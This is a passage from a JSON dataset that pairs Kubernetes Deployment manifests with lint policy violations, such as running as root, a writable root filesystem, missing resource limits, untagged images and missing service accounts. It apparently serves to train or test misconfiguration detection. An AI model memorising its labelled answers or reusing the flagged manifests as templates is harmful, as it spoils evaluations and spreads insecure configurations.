    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20210601-df2711fc5c\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --update-period=6h\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"needs-rebase\" has memory limit 0"
  },
  {
    "id": "3334",
    "manifest_path": "data/manifests/the_stack_sample/sample_1035.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prod1\n  labels:\n    app: prod1\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: prod1\n  template:\n    metadata:\n      labels:\n        app: prod1\n    spec:\n      containers:\n      - name: prod1-container\n        image: paulfdunn/prod1:v0.0.0\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8000\n        volumeMounts:\n        - mountPath: /opt/prod1/data\n          name: data\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: prod1-pvc\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "3335",
    "manifest_path": "data/manifests/the_stack_sample/sample_1035.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prod1\n  labels:\n    app: prod1\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: prod1\n  template:\n    metadata:\n      labels:\n        app: prod1\n    spec:\n      containers:\n      - name: prod1-container\n        image: paulfdunn/prod1:v0.0.0\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8000\n        volumeMounts:\n        - mountPath: /opt/prod1/data\n          name: data\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: prod1-pvc\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"prod1-container\" does not have a read-only root file system"
  },
  {
    "id": "3336",
    "manifest_path": "data/manifests/the_stack_sample/sample_1035.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prod1\n  labels:\n    app: prod1\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: prod1\n  template:\n    metadata:\n      labels:\n        app: prod1\n    spec:\n      containers:\n      - name: prod1-container\n        image: paulfdunn/prod1:v0.0.0\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8000\n        volumeMounts:\n        - mountPath: /opt/prod1/data\n          name: data\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: prod1-pvc\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"prod1-container\" is not set to runAsNonRoot"
  },
  {
    "id": "3337",
    "manifest_path": "data/manifests/the_stack_sample/sample_1035.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prod1\n  labels:\n    app: prod1\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: prod1\n  template:\n    metadata:\n      labels:\n        app: prod1\n    spec:\n      containers:\n      - name: prod1-container\n        image: paulfdunn/prod1:v0.0.0\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8000\n        volumeMounts:\n        - mountPath: /opt/prod1/data\n          name: data\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: prod1-pvc\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"prod1-container\" has cpu request 0"
  },
  {
    "id": "3338",
    "manifest_path": "data/manifests/the_stack_sample/sample_1035.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prod1\n  labels:\n    app: prod1\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: prod1\n  template:\n    metadata:\n      labels:\n        app: prod1\n    spec:\n      containers:\n      - name: prod1-container\n        image: paulfdunn/prod1:v0.0.0\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8000\n        volumeMounts:\n        - mountPath: /opt/prod1/data\n          name: data\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: prod1-pvc\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"prod1-container\" has memory limit 0"
  },
  {
    "id": "3339",
    "manifest_path": "data/manifests/the_stack_sample/sample_1036.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kctl\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kctl\n  template:\n    metadata:\n      labels:\n        app: kctl\n    spec:\n      containers:\n      - name: kctl\n        image: kg8s-local/kctl:v21.12.1\n        command:\n        - sh\n        args:\n        - -c\n        - 'cat /opt/ca.crt\n\n          cp /opt/ca.crt /usr/local/share/ca-certificates/nip-io-ca.crt\n\n          update-ca-certificates\n\n          echo \"\"\n\n          echo \"[UPDATE CA CERTIFICATE] check ca certificates\"\n\n          tail -n 20 /etc/ssl/certs/ca-certificates.crt\n\n          echo $(date) ; tail -f /dev/null\n\n          '\n        resources:\n          limits:\n            cpu: '1'\n            memory: 256Mi\n          requests:\n            cpu: 200m\n            memory: 128Mi\n        volumeMounts:\n        - name: cm-ca-nip\n          mountPath: /opt/ca.crt\n          subPath: ca.crt\n      volumes:\n      - name: cm-ca-nip\n        configMap:\n          name: ca-nip\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kctl\" does not have a read-only root file system"
  },
  {
    "id": "3340",
    "manifest_path": "data/manifests/the_stack_sample/sample_1036.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kctl\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kctl\n  template:\n    metadata:\n      labels:\n        app: kctl\n    spec:\n      containers:\n      - name: kctl\n        image: kg8s-local/kctl:v21.12.1\n        command:\n        - sh\n        args:\n        - -c\n        - 'cat /opt/ca.crt\n\n          cp /opt/ca.crt /usr/local/share/ca-certificates/nip-io-ca.crt\n\n          update-ca-certificates\n\n          echo \"\"\n\n          echo \"[UPDATE CA CERTIFICATE] check ca certificates\"\n\n          tail -n 20 /etc/ssl/certs/ca-certificates.crt\n\n          echo $(date) ; tail -f /dev/null\n\n          '\n        resources:\n          limits:\n            cpu: '1'\n            memory: 256Mi\n          requests:\n            cpu: 200m\n            memory: 128Mi\n        volumeMounts:\n        - name: cm-ca-nip\n          mountPath: /opt/ca.crt\n          subPath: ca.crt\n      volumes:\n      - name: cm-ca-nip\n        configMap:\n          name: ca-nip\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kctl\" is not set to runAsNonRoot"
  },
  {
    "id": "3341",
    "manifest_path": "data/manifests/the_stack_sample/sample_1038.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\nspec:\n  selector:\n    matchLabels:\n      app: guestbook\n      tier: frontend\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: guestbook\n        tier: frontend\n    spec:\n      containers:\n      - name: php-redis\n        image: naoyoshi/mb-ui\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: GET_HOSTS_FROM\n          value: dns\n        ports:\n        - containerPort: 80\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"php-redis\" is using an invalid container image, \"naoyoshi/mb-ui\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "3342",
    "manifest_path": "data/manifests/the_stack_sample/sample_1038.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\nspec:\n  selector:\n    matchLabels:\n      app: guestbook\n      tier: frontend\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: guestbook\n        tier: frontend\n    spec:\n      containers:\n      - name: php-redis\n        image: naoyoshi/mb-ui\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: GET_HOSTS_FROM\n          value: dns\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"php-redis\" does not have a read-only root file system"
  },
  {
    "id": "3343",
    "manifest_path": "data/manifests/the_stack_sample/sample_1038.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\nspec:\n  selector:\n    matchLabels:\n      app: guestbook\n      tier: frontend\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: guestbook\n        tier: frontend\n    spec:\n      containers:\n      - name: php-redis\n        image: naoyoshi/mb-ui\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: GET_HOSTS_FROM\n          value: dns\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"php-redis\" is not set to runAsNonRoot"
  },
  {
    "id": "3344",
    "manifest_path": "data/manifests/the_stack_sample/sample_1038.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\nspec:\n  selector:\n    matchLabels:\n      app: guestbook\n      tier: frontend\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: guestbook\n        tier: frontend\n    spec:\n      containers:\n      - name: php-redis\n        image: naoyoshi/mb-ui\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: GET_HOSTS_FROM\n          value: dns\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"php-redis\" has memory limit 0"
  },
  {
    "id": "3345",
    "manifest_path": "data/manifests/the_stack_sample/sample_1039.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: auto-deploy\n  template:\n    metadata:\n      labels:\n        app: auto-deploy\n    spec:\n      containers:\n      - name: server\n        image: gcr.io/kubeflow-ci/auto_deploy\n        command:\n        - python\n        - -m\n        - kubeflow.testing.auto_deploy.server\n        - serve\n        - --template-folder=/app/templates\n        - --deployments-dir=/cache/deployments\n        - --port=80\n        resources:\n          requests:\n            cpu: 2\n            memory: 8Gi\n        workingDir: /app\n        volumeMounts:\n        - name: config\n          mountPath: /app/config\n        - name: cache\n          mountPath: /cache\n      - name: reconciler\n        image: gcr.io/kubeflow-ci/auto_deploy\n        command:\n        - python\n        - -m\n        - kubeflow.testing.auto_deploy.reconciler\n        - run\n        - --config-path=/app/config/deployments.yaml\n        - --job-template-path=/app/config/deploy-kubeflow.yaml\n        - --local-dir=/cache/auto_deploy_src\n        - --deployments-dir=/cache/deployments\n        env:\n        - name: JOB_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        resources:\n          requests:\n            cpu: 2\n            memory: 8Gi\n        workingDir: /app\n        volumeMounts:\n        - name: config\n          mountPath: /app/config\n        - name: cache\n          mountPath: /cache\n      serviceAccount: default-editor\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: cache\n        emptyDir: {}\n",
    "policy_id": "deprecated-service-account-field",
    "violation_text": "serviceAccount is specified (default-editor), but this field is deprecated; use serviceAccountName instead"
  },
  {
    "id": "3346",
    "manifest_path": "data/manifests/the_stack_sample/sample_1039.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: auto-deploy\n  template:\n    metadata:\n      labels:\n        app: auto-deploy\n    spec:\n      containers:\n      - name: server\n        image: gcr.io/kubeflow-ci/auto_deploy\n        command:\n        - python\n        - -m\n        - kubeflow.testing.auto_deploy.server\n        - serve\n        - --template-folder=/app/templates\n        - --deployments-dir=/cache/deployments\n        - --port=80\n        resources:\n          requests:\n            cpu: 2\n            memory: 8Gi\n        workingDir: /app\n        volumeMounts:\n        - name: config\n          mountPath: /app/config\n        - name: cache\n          mountPath: /cache\n      - name: reconciler\n        image: gcr.io/kubeflow-ci/auto_deploy\n        command:\n        - python\n        - -m\n        - kubeflow.testing.auto_deploy.reconciler\n        - run\n        - --config-path=/app/config/deployments.yaml\n        - --job-template-path=/app/config/deploy-kubeflow.yaml\n        - --local-dir=/cache/auto_deploy_src\n        - --deployments-dir=/cache/deployments\n        env:\n        - name: JOB_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        resources:\n          requests:\n            cpu: 2\n            memory: 8Gi\n        workingDir: /app\n        volumeMounts:\n        - name: config\n          mountPath: /app/config\n        - name: cache\n          mountPath: /cache\n      serviceAccount: default-editor\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: cache\n        emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"reconciler\" is using an invalid container image, \"gcr.io/kubeflow-ci/auto_deploy\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "3347",
    "manifest_path": "data/manifests/the_stack_sample/sample_1039.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: auto-deploy\n  template:\n    metadata:\n      labels:\n        app: auto-deploy\n    spec:\n      containers:\n      - name: server\n        image: gcr.io/kubeflow-ci/auto_deploy\n        command:\n        - python\n        - -m\n        - kubeflow.testing.auto_deploy.server\n        - serve\n        - --template-folder=/app/templates\n        - --deployments-dir=/cache/deployments\n        - --port=80\n        resources:\n          requests:\n            cpu: 2\n            memory: 8Gi\n        workingDir: /app\n        volumeMounts:\n        - name: config\n          mountPath: /app/config\n        - name: cache\n          mountPath: /cache\n      - name: reconciler\n        image: gcr.io/kubeflow-ci/auto_deploy\n        command:\n        - python\n        - -m\n        - kubeflow.testing.auto_deploy.reconciler\n        - run\n        - --config-path=/app/config/deployments.yaml\n        - --job-template-path=/app/config/deploy-kubeflow.yaml\n        - --local-dir=/cache/auto_deploy_src\n        - --deployments-dir=/cache/deployments\n        env:\n        - name: JOB_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        resources:\n          requests:\n            cpu: 2\n            memory: 8Gi\n        workingDir: /app\n        volumeMounts:\n        - name: config\n          mountPath: /app/config\n        - name: cache\n          mountPath: /cache\n      serviceAccount: default-editor\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: cache\n        emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"server\" is using an invalid container image, \"gcr.io/kubeflow-ci/auto_deploy\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "3348",
    "manifest_path": "data/manifests/the_stack_sample/sample_1039.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: auto-deploy\n  template:\n    metadata:\n      labels:\n        app: auto-deploy\n    spec:\n      containers:\n      - name: server\n        image: gcr.io/kubeflow-ci/auto_deploy\n        command:\n        - python\n        - -m\n        - kubeflow.testing.auto_deploy.server\n        - serve\n        - --template-folder=/app/templates\n        - --deployments-dir=/cache/deployments\n        - --port=80\n        resources:\n          requests:\n            cpu: 2\n            memory: 8Gi\n        workingDir: /app\n        volumeMounts:\n        - name: config\n          mountPath: /app/config\n        - name: cache\n          mountPath: /cache\n      - name: reconciler\n        image: gcr.io/kubeflow-ci/auto_deploy\n        command:\n        - python\n        - -m\n        - kubeflow.testing.auto_deploy.reconciler\n        - run\n        - --config-path=/app/config/deployments.yaml\n        - --job-template-path=/app/config/deploy-kubeflow.yaml\n        - --local-dir=/cache/auto_deploy_src\n        - --deployments-dir=/cache/deployments\n        env:\n        - name: JOB_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        resources:\n          requests:\n            cpu: 2\n            memory: 8Gi\n        workingDir: /app\n        volumeMounts:\n        - name: config\n          mountPath: /app/config\n        - name: cache\n          mountPath: /cache\n      serviceAccount: default-editor\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: cache\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"reconciler\" does not have a read-only root file system"
  },
  {
    "id": "3349",
    "manifest_path": "data/manifests/the_stack_sample/sample_1039.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: auto-deploy\n  template:\n    metadata:\n      labels:\n        app: auto-deploy\n    spec:\n      containers:\n      - name: server\n        image: gcr.io/kubeflow-ci/auto_deploy\n        command:\n        - python\n        - -m\n        - kubeflow.testing.auto_deploy.server\n        - serve\n        - --template-folder=/app/templates\n        - --deployments-dir=/cache/deployments\n        - --port=80\n        resources:\n          requests:\n            cpu: 2\n            memory: 8Gi\n        workingDir: /app\n        volumeMounts:\n        - name: config\n          mountPath: /app/config\n        - name: cache\n          mountPath: /cache\n      - name: reconciler\n        image: gcr.io/kubeflow-ci/auto_deploy\n        command:\n        - python\n        - -m\n        - kubeflow.testing.auto_deploy.reconciler\n        - run\n        - --config-path=/app/config/deployments.yaml\n        - --job-template-path=/app/config/deploy-kubeflow.yaml\n        - --local-dir=/cache/auto_deploy_src\n        - --deployments-dir=/cache/deployments\n        env:\n        - name: JOB_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        resources:\n          requests:\n            cpu: 2\n            memory: 8Gi\n        workingDir: /app\n        volumeMounts:\n        - name: config\n          mountPath: /app/config\n        - name: cache\n          mountPath: /cache\n      serviceAccount: default-editor\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: cache\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "3350",
    "manifest_path": "data/manifests/the_stack_sample/sample_1039.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: auto-deploy\n  template:\n    metadata:\n      labels:\n        app: auto-deploy\n    spec:\n      containers:\n      - name: server\n        image: gcr.io/kubeflow-ci/auto_deploy\n        command:\n        - python\n        - -m\n        - kubeflow.testing.auto_deploy.server\n        - serve\n        - --template-folder=/app/templates\n        - --deployments-dir=/cache/deployments\n        - --port=80\n        resources:\n          requests:\n            cpu: 2\n            memory: 8Gi\n        workingDir: /app\n        volumeMounts:\n        - name: config\n          mountPath: /app/config\n        - name: cache\n          mountPath: /cache\n      - name: reconciler\n        image: gcr.io/kubeflow-ci/auto_deploy\n        command:\n        - python\n        - -m\n        - kubeflow.testing.auto_deploy.reconciler\n        - run\n        - --config-path=/app/config/deployments.yaml\n        - --job-template-path=/app/config/deploy-kubeflow.yaml\n        - --local-dir=/cache/auto_deploy_src\n        - --deployments-dir=/cache/deployments\n        env:\n        - name: JOB_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        resources:\n          requests:\n            cpu: 2\n            memory: 8Gi\n        workingDir: /app\n        volumeMounts:\n        - name: config\n          mountPath: /app/config\n        - name: cache\n          mountPath: /cache\n      serviceAccount: default-editor\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: cache\n        emptyDir: {}\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"default-editor\" not found"
  },
  {
    "id": "3351",
    "manifest_path": "data/manifests/the_stack_sample/sample_1039.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: auto-deploy\n  template:\n    metadata:\n      labels:\n        app: auto-deploy\n    spec:\n      containers:\n      - name: server\n        image: gcr.io/kubeflow-ci/auto_deploy\n        command:\n        - python\n        - -m\n        - kubeflow.testing.auto_deploy.server\n        - serve\n        - --template-folder=/app/templates\n        - --deployments-dir=/cache/deployments\n        - --port=80\n        resources:\n          requests:\n            cpu: 2\n            memory: 8Gi\n        workingDir: /app\n        volumeMounts:\n        - name: config\n          mountPath: /app/config\n        - name: cache\n          mountPath: /cache\n      - name: reconciler\n        image: gcr.io/kubeflow-ci/auto_deploy\n        command:\n        - python\n        - -m\n        - kubeflow.testing.auto_deploy.reconciler\n        - run\n        - --config-path=/app/config/deployments.yaml\n        - --job-template-path=/app/config/deploy-kubeflow.yaml\n        - --local-dir=/cache/auto_deploy_src\n        - --deployments-dir=/cache/deployments\n        env:\n        - name: JOB_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        resources:\n          requests:\n            cpu: 2\n            memory: 8Gi\n        workingDir: /app\n        volumeMounts:\n        - name: config\n          mountPath: /app/config\n        - name: cache\n          mountPath: /cache\n      serviceAccount: default-editor\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: cache\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"reconciler\" is not set to runAsNonRoot"
  },
  {
    "id": "3352",
    "manifest_path": "data/manifests/the_stack_sample/sample_1039.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: auto-deploy\n  template:\n    metadata:\n      labels:\n        app: auto-deploy\n    spec:\n      containers:\n      - name: server\n        image: gcr.io/kubeflow-ci/auto_deploy\n        command:\n        - python\n        - -m\n        - kubeflow.testing.auto_deploy.server\n        - serve\n        - --template-folder=/app/templates\n        - --deployments-dir=/cache/deployments\n        - --port=80\n        resources:\n          requests:\n            cpu: 2\n            memory: 8Gi\n        workingDir: /app\n        volumeMounts:\n        - name: config\n          mountPath: /app/config\n        - name: cache\n          mountPath: /cache\n      - name: reconciler\n        image: gcr.io/kubeflow-ci/auto_deploy\n        command:\n        - python\n        - -m\n        - kubeflow.testing.auto_deploy.reconciler\n        - run\n        - --config-path=/app/config/deployments.yaml\n        - --job-template-path=/app/config/deploy-kubeflow.yaml\n        - --local-dir=/cache/auto_deploy_src\n        - --deployments-dir=/cache/deployments\n        env:\n        - name: JOB_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        resources:\n          requests:\n            cpu: 2\n            memory: 8Gi\n        workingDir: /app\n        volumeMounts:\n        - name: config\n          mountPath: /app/config\n        - name: cache\n          mountPath: /cache\n      serviceAccount: default-editor\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: cache\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "3353",
    "manifest_path": "data/manifests/the_stack_sample/sample_1039.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: auto-deploy\n  template:\n    metadata:\n      labels:\n        app: auto-deploy\n    spec:\n      containers:\n      - name: server\n        image: gcr.io/kubeflow-ci/auto_deploy\n        command:\n        - python\n        - -m\n        - kubeflow.testing.auto_deploy.server\n        - serve\n        - --template-folder=/app/templates\n        - --deployments-dir=/cache/deployments\n        - --port=80\n        resources:\n          requests:\n            cpu: 2\n            memory: 8Gi\n        workingDir: /app\n        volumeMounts:\n        - name: config\n          mountPath: /app/config\n        - name: cache\n          mountPath: /cache\n      - name: reconciler\n        image: gcr.io/kubeflow-ci/auto_deploy\n        command:\n        - python\n        - -m\n        - kubeflow.testing.auto_deploy.reconciler\n        - run\n        - --config-path=/app/config/deployments.yaml\n        - --job-template-path=/app/config/deploy-kubeflow.yaml\n        - --local-dir=/cache/auto_deploy_src\n        - --deployments-dir=/cache/deployments\n        env:\n        - name: JOB_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        resources:\n          requests:\n            cpu: 2\n            memory: 8Gi\n        workingDir: /app\n        volumeMounts:\n        - name: config\n          mountPath: /app/config\n        - name: cache\n          mountPath: /cache\n      serviceAccount: default-editor\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: cache\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"reconciler\" has memory limit 0"
  },
  {
    "id": "3354",
    "manifest_path": "data/manifests/the_stack_sample/sample_1039.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: auto-deploy\n  template:\n    metadata:\n      labels:\n        app: auto-deploy\n    spec:\n      containers:\n      - name: server\n        image: gcr.io/kubeflow-ci/auto_deploy\n        command:\n        - python\n        - -m\n        - kubeflow.testing.auto_deploy.server\n        - serve\n        - --template-folder=/app/templates\n        - --deployments-dir=/cache/deployments\n        - --port=80\n        resources:\n          requests:\n            cpu: 2\n            memory: 8Gi\n        workingDir: /app\n        volumeMounts:\n        - name: config\n          mountPath: /app/config\n        - name: cache\n          mountPath: /cache\n      - name: reconciler\n        image: gcr.io/kubeflow-ci/auto_deploy\n        command:\n        - python\n        - -m\n        - kubeflow.testing.auto_deploy.reconciler\n        - run\n        - --config-path=/app/config/deployments.yaml\n        - --job-template-path=/app/config/deploy-kubeflow.yaml\n        - --local-dir=/cache/auto_deploy_src\n        - --deployments-dir=/cache/deployments\n        env:\n        - name: JOB_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        resources:\n          requests:\n            cpu: 2\n            memory: 8Gi\n        workingDir: /app\n        volumeMounts:\n        - name: config\n          mountPath: /app/config\n        - name: cache\n          mountPath: /cache\n      serviceAccount: default-editor\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: cache\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"server\" has memory limit 0"
  },
  {
    "id": "3355",
    "manifest_path": "data/manifests/the_stack_sample/sample_1041.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: load-balancer-example\n  name: hello-world\nspec:\n  replicas: 5\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: load-balancer-example\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: load-balancer-example\n    spec:\n      containers:\n      - image: nikhil101/django-k8s:2.1\n        name: hello-world\n        ports:\n        - containerPort: 8000\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 5 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "3356",
    "manifest_path": "data/manifests/the_stack_sample/sample_1041.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: load-balancer-example\n  name: hello-world\nspec:\n  replicas: 5\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: load-balancer-example\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: load-balancer-example\n    spec:\n      containers:\n      - image: nikhil101/django-k8s:2.1\n        name: hello-world\n        ports:\n        - containerPort: 8000\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hello-world\" does not have a read-only root file system"
  },
  {
    "id": "3357",
    "manifest_path": "data/manifests/the_stack_sample/sample_1041.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: load-balancer-example\n  name: hello-world\nspec:\n  replicas: 5\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: load-balancer-example\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: load-balancer-example\n    spec:\n      containers:\n      - image: nikhil101/django-k8s:2.1\n        name: hello-world\n        ports:\n        - containerPort: 8000\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hello-world\" is not set to runAsNonRoot"
  },
  {
    "id": "3358",
    "manifest_path": "data/manifests/the_stack_sample/sample_1041.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: load-balancer-example\n  name: hello-world\nspec:\n  replicas: 5\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: load-balancer-example\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: load-balancer-example\n    spec:\n      containers:\n      - image: nikhil101/django-k8s:2.1\n        name: hello-world\n        ports:\n        - containerPort: 8000\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hello-world\" has cpu request 0"
  },
  {
    "id": "3359",
    "manifest_path": "data/manifests/the_stack_sample/sample_1041.yaml",
